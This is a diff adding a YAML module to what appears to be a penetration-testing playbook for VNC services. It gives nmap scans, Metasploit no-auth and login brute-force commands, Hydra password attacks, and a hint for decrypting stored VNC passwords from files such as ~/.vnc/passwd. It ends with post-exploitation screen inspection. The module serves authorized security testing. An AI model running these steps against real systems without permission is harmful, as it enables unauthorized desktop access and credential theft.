@@ -1,0 +1,70 @@
+module: vnc
+name: VNC (5900 / 5901)
+inputs: [PASS, OUT]
+
+sections:
+
+  - id: initial
+    name: Initial Access & Detection
+    steps:
+      - id: version
+        text: Confirm live / version + security types
+        commands: |
+          nmap -p$PORT -sV -sC $IP
+          nmap -p$PORT --script=vnc-info $IP
+      - id: title
+        text: Grab desktop title (often leaks host/user)
+        commands: |
+          nmap -p$PORT --script=vnc-title $IP
+
+  - id: vuln
+    name: Vulnerability Identification
+    steps:
+      - id: none_auth
+        text: Check for "None" / no authentication
+        commands: |
+          msfconsole -qx "use auxiliary/scanner/vnc/vnc_none_auth; set RHOSTS $IP; set RPORT $PORT; run; exit"
+      - id: cve_map
+        text: Version to CVE mapping (RealVNC 4.1.1 auth bypass, etc.)
+        commands: |
+          searchsploit vnc
+          searchsploit realvnc
+
+  - id: creds
+    name: Default & Weak Credentials
+    authorized: true
+    steps:
+      - id: brute
+        text: Password brute-force (VNC uses password-only auth)
+        commands: |
+          hydra -P $PASSLIST vnc://$IP -s $PORT
+          nmap -p$PORT --script=vnc-brute --script-args passdb=$PASSLIST $IP
+      - id: brute_msf
+        text: Brute-force via Metasploit
+        commands: |
+          msfconsole -qx "use auxiliary/scanner/vnc/vnc_login; set RHOSTS $IP; set RPORT $PORT; set PASS_FILE $PASSLIST; run; exit"
+      - id: crack_stored
+        text: Decrypt a captured/stored VNC password (fixed DES key)
+        manual: true
+        commands: |
+          # vncpwd <file>   OR  echo -n <hex> | openssl enc -des-cbc -d -K e84ad0c2e5e?? ...
+          # common source: ~/.vnc/passwd, registry, VNC config files
+
+  - id: access
+    name: Access & Post-Exploitation
+    steps:
+      - id: connect
+        text: Connect to the desktop
+        commands: |
+          vncviewer $IP:$PORT
+          vncviewer $IP::$PORT -passwd pass.file
+      - id: screenshot
+        text: Non-interactive screenshot / recon of the session
+        manual: true
+        commands: |
+          # vncsnapshot $IP:$PORT out.jpg
+      - id: notes
+        text: Note what the logged-in session exposes (often SYSTEM/admin GUI)
+        manual: true
+        commands: |
+          # look for open password managers, terminals, RDP/SSH sessions on screen
